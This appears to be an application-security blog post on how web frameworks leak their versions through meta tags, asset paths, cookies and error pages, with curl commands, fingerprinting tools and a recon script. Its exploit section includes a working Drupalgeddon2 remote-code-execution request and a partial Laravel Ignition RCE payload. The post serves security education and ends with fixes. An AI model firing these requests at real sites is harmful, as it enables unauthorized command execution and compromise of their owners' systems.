# Framework Version Disclosure: Know the Framework, Know the Attack

**Severity:** MEDIUM | **Category:** Fingerprinting | **Series:** #300DaysWithAppSec

---

## More Dangerous Than Server Headers

Server banner disclosure tells you what web server is running. Framework version disclosure tells you something far more valuable: **exactly what application framework handles the business logic**. And frameworks have vastly more CVEs than web servers — especially CMSes like WordPress, Drupal, and Joomla.

The information hides in six different places on most websites — and most developers never think to remove it.

---

## Where Framework Versions Hide

### 1. HTML Generator Meta Tag (Most Common)

```bash
curl -s https://target.com | grep -i "generator\|powered\|version"

# WordPress
<meta name="generator" content="WordPress 5.8" />

# Drupal
<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />

# Joomla
<meta name="generator" content="Joomla! 3.10 - Open Source Content Management" />

# Wix
<meta name="generator" content="Wix.com Website Builder" />
```

### 2. Asset File Paths With Version Query Strings

```bash
curl -s https://target.com | grep -oE 'ver=[0-9.]+' | sort -u

# WordPress reveals exact version:
/wp-includes/js/jquery/jquery.min.js?ver=5.8.3
/wp-content/themes/twentyone/style.css?ver=5.8.3
# → WordPress 5.8.3 confirmed
```

### 3. HTML Comments

```html
<!-- Search source code for these patterns -->
<!-- Joomla! 3.10 - Open Source Content Management -->
<!-- This site is optimized with the Yoast SEO 18.0 -->
<!-- Powered by vBulletin 4.2.5 -->
```

### 4. Cookie Names and Values

```bash
curl -sI https://target.com | grep -i "set-cookie"

# Framework fingerprints via cookies:
# ci_session → CodeIgniter
# laravel_session → Laravel
# CAKEPHP → CakePHP
# django_session → Django
# JSESSIONID → Java EE app server
```

### 5. Error Pages

```bash
# Trigger 404 or 500 to expose framework error page
curl -s https://target.com/nonexistent-page-xyz-404

# Django debug mode → complete stack trace + version
# Laravel → Ignition error page with version
# Spring Boot → Whitelabel Error Page
# Express → "Cannot GET /path" with stack info
```

### 6. Default Admin Paths (Confirms CMS)

```bash
# If /wp-admin/ returns 302/200 → WordPress
# If /administrator/ returns 200 → Joomla
# If /user/login returns 200 → Drupal
# These don't give version but confirm framework
```

---

## Detection Tools

```bash
# whatweb — most comprehensive single command
whatweb https://target.com -v
# Output:
# WordPress[5.8.3], PHP[7.4.3], JQuery[3.6.0], MySQL, Apache

# Wappalyzer CLI
npm install -g wappalyzer-cli
wappalyzer https://target.com

# httpx — bulk fingerprint all subdomains
cat subs.txt | httpx -silent -tech-detect -title -status-code

# Custom grep — fast and scriptable
curl -s https://target.com | \
    grep -oiE "(wordpress|drupal|joomla|laravel|django|rails) [0-9.]+" | \
    sort -u
```

---

## Framework Version → CVE → Exploit Path

### WordPress

```bash
# Get WordPress version
curl -s https://target.com/wp-login.php | grep -oE "ver=[0-9.]+"
# OR
curl -s https://target.com/readme.html | grep "Version"

# Version → check WPScan vulnerability database
wpscan --url https://target.com --enumerate vp,vt,u
# vp = vulnerable plugins, vt = vulnerable themes, u = users

# WordPress < 5.8.3: SQLi via WP_Query
# WordPress < 5.4.2: Authenticated RCE
```

### Drupal

```bash
# Drupalgeddon2 — one of the most impactful CMS CVEs
# Affects: Drupal 6, 7, 8 → Remote Code Execution
# CVSS: 9.8

# Confirm Drupal and version
curl -s https://target.com/CHANGELOG.txt | head -3
# Drupal 7.58, 2018-03-28

# Test Drupalgeddon2 (CVE-2018-7600)
curl "https://target.com/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup" \
    --data "form_build_id="
```

### Laravel with Debug Mode

```bash
# Check if debug mode is enabled
curl -s https://target.com/nonexistent
# If you see Ignition error page → debug mode ON

# RCE via _ignition endpoint (CVE-2021-3129)
# Affects: Laravel 8.4.2 and below
curl -X POST https://target.com/_ignition/execute-solution \
    -H "Content-Type: application/json" \
    -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.base64-decode|convert.base64-encode|convert.iconv.utf-16be.utf-8|convert.quoted-printable-encode|..."}}'
```

### Django Debug Mode

```bash
# Django DEBUG=True → full settings page accessible
curl https://target.com/nonexistent-page

# If response contains "Django Version: X.X.X" → debug is ON
# SECRET_KEY exposed → forge session cookies → auth bypass
# Database settings exposed → direct DB connection possible
```

---

## Full Fingerprinting Script

```bash
#!/bin/bash
TARGET="${1:-https://target.com}"

echo "=== Framework Version Fingerprint: $TARGET ==="

echo "[1] HTTP Headers..."
curl -sI "$TARGET" | grep -iE "server|powered|generator|framework|x-" | head -10

echo "[2] HTML Source..."
curl -s "$TARGET" | grep -iE "generator|wordpress|drupal|joomla|laravel|django" | head -5

echo "[3] Asset Version Strings..."
curl -s "$TARGET" | grep -oE "ver=[0-9.]+" | sort -u | head -10

echo "[4] Cookies..."
curl -sI "$TARGET" | grep -i "set-cookie" | head -5

echo "[5] whatweb..."
whatweb "$TARGET" 2>/dev/null | head -5

echo "[6] 404 Error Page..."
curl -s "$TARGET/xyz-nonexistent-$(date +%s)" | \
    grep -iE "django|laravel|express|spring|rails|version" | head -3
```

---

## Key Takeaways

```
1. Framework version hides in: meta tags, asset paths, cookies, error pages
2. WordPress ver= in asset paths reveals exact version instantly
3. Drupal CHANGELOG.txt reveals version in plain text
4. Generator meta tag: most CMSes include it by default
5. Tools: whatweb (best), httpx -tech-detect (bulk), wappalyzer-cli
6. Priority targets: old WordPress, Drupal 7.x, Laravel with debug ON
7. Django/Laravel debug mode = CRITICAL regardless of version
8. Fix: remove generator meta, suppress ver= params, disable debug in prod
```

---

*Written by Anand Prajapati — Penetration Tester & Security Researcher*

🔗 **Connect:** [LinkedIn](https://linkedin.com/in/anand-prajapati-7a265a369) · [GitHub](https://github.com/anand87794) · [Portfolio](https://anandprajapati.lovable.app) · [X @anand87794](https://x.com/anand87794)

*Part of the #300DaysWithAppSec series — 300 vulnerabilities, real security education.*
